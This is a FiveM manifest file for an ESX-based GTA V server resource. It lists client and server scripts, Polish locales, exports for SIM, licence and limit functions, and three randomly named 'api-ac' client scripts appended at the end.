fx_version "bodacious"

games {"gta5"}
lua54 'yes'

client_scripts {
    '@es_extended/locale.lua',
    'locales/pl.lua',
    'config.lua',
    'client/client.lua',
}
server_scripts {
    '@oxmysql/lib/MySQL.lua',
    '@es_extended/locale.lua',
    'locales/pl.lua',
    'server/server.lua'
}

exports {
    'GetSims',
    'OpenLicensesMenu',
    'GetLimits',
    'LevelPrices',
}


client_script "api-ac_OJOKaWCvUYzT.lua"
client_script "api-ac_vOJKHGqGxvPe.lua"
client_script "api-ac_uuQhioHoEMHi.lua"